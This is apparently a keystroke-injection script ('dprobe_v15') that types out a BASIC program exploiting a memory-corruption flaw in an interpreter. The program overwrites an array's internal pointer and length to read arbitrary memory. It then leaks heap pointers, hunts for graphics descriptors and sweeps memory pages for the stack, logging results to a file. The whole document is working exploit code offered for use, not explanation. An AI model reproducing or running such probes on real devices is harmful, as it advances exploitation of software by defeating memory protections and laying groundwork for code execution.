REM dprobe_v15 graphics-descriptor + stack hunt -- compact TapDucky payload
DEFAULTDELAY 40
DELAY 2000
STRINGLN VAR NSR,ZERO$=CHR$(0),I
STRINGLN VAR CAP$
STRINGLN FOR I=1 TO 18:ZERO$=ZERO$+ZERO$:NEXT
STRINGLN NSR=ARRAY$(4)
STRINGLN COPY NSR[0],0,"0000":COPY NSR[1],0,"1111"
STRINGLN COPY NSR[2],0,"2222":COPY NSR[3],0,"3333"
STRINGLN PRINT "DIST PROBE READY",1034
STRINGLN END
STRINGLN COMMON DEF P$(V#)
STRINGLN VAR S$="",J
STRINGLN FOR J=0 TO 3
STRINGLN S$=S$+CHR$(V#-FLOOR(V#/65536)*65536):V#=FLOOR(V#/65536)
STRINGLN NEXT
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF U#(S$)
STRINGLN VAR V#=0,J
STRINGLN IF LEN(S$)<4 THEN RETURN 0
STRINGLN FOR J=3 TO 0 STEP -1:V#=V#*65536+ASC(MID$(S$,J,1)):NEXT
STRINGLN RETURN V#
STRINGLN END
STRINGLN COMMON DEF PTR(V#,A)
STRINGLN RETURN V#>0 && V#<549755813888 && V#==FLOOR(V#/A)*A
STRINGLN END
STRINGLN COMMON DEF HX$(V#)
STRINGLN VAR S$="",J,A
STRINGLN FOR J=0 TO 11
STRINGLN A=V#-FLOOR(V#/16)*16
STRINGLN S$=MID$("0123456789ABCDEF",A,1)+S$
STRINGLN V#=FLOOR(V#/16)
STRINGLN NEXT
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF PLOG(S$)
STRINGLN CAP$=CAP$+S$+CHR$(10):PRINT S$:RETURN ""
STRINGLN END
STRINGLN COMMON DEF FLOG(S$)
STRINGLN CAP$=CAP$+S$+CHR$(10):RETURN ""
STRINGLN END
STRINGLN COMMON DEF AIM(A#,N)
STRINGLN COPY NSR[0],16,P$(A#)+P$(N)
STRINGLN RETURN ""
STRINGLN END
STRINGLN COMMON DEF PROBE()
STRINGLN VAR V$,D$,X$,T$,J,V#,L#,N,K,E0#,E3#,OD$,PG#,DD#,GO#,S$
STRINGLN X$=PLOG("== S1 ==")
STRINGLN V$=COPY(NSR[0],0,16)
STRINGLN FOR J=0 TO 3
STRINGLN V#=U#(MID$(V$,J*4,4))
STRINGLN X$=PLOG("W"+STR$(J)+" "+HX$(V#)+" "+STR$(PTR(V#,16)))
STRINGLN NEXT
STRINGLN E0#=U#(MID$(V$,0,4)):E3#=U#(MID$(V$,12,4))
STRINGLN X$=PLOG("LEN "+HX$(LEN(NSR[0])))
STRINGLN IF !PTR(E0#,16) || !PTR(E3#,16) THEN X$=PLOG("PTRBAD"):SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
STRINGLN OD$=COPY(NSR[0],16,8)
STRINGLN X$=PLOG("S1 OK")
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN X$=PLOG("== S2G ==")
STRINGLN D$=COPY(NSR[0],0,5120)
STRINGLN N=0:GO#=0
STRINGLN IF LEN(D$)==5120 THEN
STRINGLN FOR J=0 TO 5116 STEP 4
STRINGLN V#=U#(MID$(D$,J,4))
STRINGLN IF V#>=E0#-8388608 && V#<=E0#-2097152 THEN
STRINGLN N=N+1
STRINGLN X$=PLOG("G"+STR$(J)+" "+HX$(V#))
STRINGLN IF GO#==0 THEN GO#=J
STRINGLN IF N>=10 THEN BREAK
STRINGLN ENDIF
STRINGLN NEXT
STRINGLN ENDIF
STRINGLN D$=COPY(NSR[0],16,48)
STRINGLN X$=AIM(E0#-1248,624)
STRINGLN D$=COPY(NSR[1],0,624)
STRINGLN COPY NSR[0],16,OD$
STRINGLN IF LEN(D$)==624 THEN
STRINGLN FOR J=0 TO 620 STEP 4
STRINGLN V#=U#(MID$(D$,J,4))
STRINGLN IF V#>=E0#-8388608 && V#<=E0#-2097152 THEN
STRINGLN N=N+1
STRINGLN X$=PLOG("GB"+STR$(J)+" "+HX$(V#))
STRINGLN IF N>=10 THEN BREAK
STRINGLN ENDIF
STRINGLN NEXT
STRINGLN ENDIF
STRINGLN X$=PLOG("GN "+STR$(N))
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN X$=PLOG("== S3H ==")
STRINGLN IF GO#>0 THEN
STRINGLN D$=COPY(NSR[0],GO#-24,96)
STRINGLN IF LEN(D$)==96 THEN
STRINGLN FOR J=0 TO 88 STEP 8
STRINGLN V#=U#(MID$(D$,J,4))
STRINGLN L#=U#(MID$(D$,J+4,4))
STRINGLN X$=PLOG("H"+STR$(GO#-24+J)+" "+HX$(V#)+" "+HX$(L#))
STRINGLN NEXT
STRINGLN ENDIF
STRINGLN ELSE
STRINGLN X$=AIM(E0#-1248,624)
STRINGLN D$=COPY(NSR[1],0,624)
STRINGLN COPY NSR[0],16,OD$
STRINGLN X$=PLOG("NOG")
STRINGLN ENDIF
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN X$=PLOG("== S4S ==")
STRINGLN N=0
STRINGLN FOR K=0 TO 8191
STRINGLN IF K<4096 THEN PG#=E0#-1248-(K+1)*65536 ELSE PG#=E0#+(K-4095)*65536
STRINGLN X$=AIM(PG#,8)
STRINGLN T$=COPY(NSR[1],0,8)
STRINGLN COPY NSR[0],16,OD$
STRINGLN V#=U#(T$)
STRINGLN IF V#>=4294967296 && V#<281474976710656 THEN
STRINGLN N=N+1
STRINGLN IF N<=12 THEN X$=PLOG("S"+STR$(K)+" "+HX$(PG#)+" "+HX$(V#))
STRINGLN ENDIF
STRINGLN IF K MOD 256==0 THEN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN NEXT
STRINGLN X$=PLOG("SN "+STR$(N))
STRINGLN X$=PLOG("DONE")
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN RETURN 1
STRINGLN END
